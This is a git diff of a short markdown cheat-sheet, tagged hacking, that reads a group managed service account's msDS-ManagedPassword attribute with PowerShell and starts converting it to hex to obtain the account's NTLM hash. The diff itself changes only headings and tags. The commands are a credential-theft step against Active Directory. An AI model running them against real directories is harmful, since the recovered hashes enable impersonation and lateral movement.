@@ -1,9 +1,12 @@
-# active directory  GMSA group managed service account read NTLM hash with powershell + python
+# decode GMSA NTLM hash
+
+- get hex string
 ```powershell
 $gmsa = Get-ADServiceAccount -Identity GMSAccount -Properties 'msDS-ManagedPassword'
 $mp = $gmsa.'msDS-ManagedPassword'
 echo $mp
 ```
+- convert
 ```bash
 # managed_password is the output of `echo $mp`
 cat managed_password | awk '{ printf("%.2x", $1) }' > managed_password.hex
@@ -21,4 +24,4 @@ cat managed_password | awk '{ printf("%.2x", $1) }' > managed_password.hex
 
 Tags:
 
-    #hacking #windows
+    #hacking #windows #ad #password #powershell #python
